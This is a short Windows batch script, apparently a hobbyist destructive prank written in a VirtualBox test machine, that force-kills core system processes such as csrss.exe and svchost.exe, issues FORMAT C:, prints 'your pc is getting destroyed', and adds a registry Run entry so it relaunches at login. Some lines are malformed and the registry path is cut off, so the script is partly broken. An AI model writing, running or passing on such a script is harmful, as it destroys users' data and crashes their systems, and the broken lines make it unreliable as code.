
@echo off

taskkill /f /im explorer.exe

taskkill /f /im svchost.exe

taskkill /f /im audiodg.exe taskkill /f /im csrss.exe

taskkill /f /im system32

taskkill /f /im bootcfg.exe

taskkill /f /im winload.exe

FORMAT C:

echo your pc is getting destroyed, click any key to continue...

timeout 5

pause

ipconfig

REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "mega.bat" /d "C:\Users\vboxuser\Des

start explorer.exe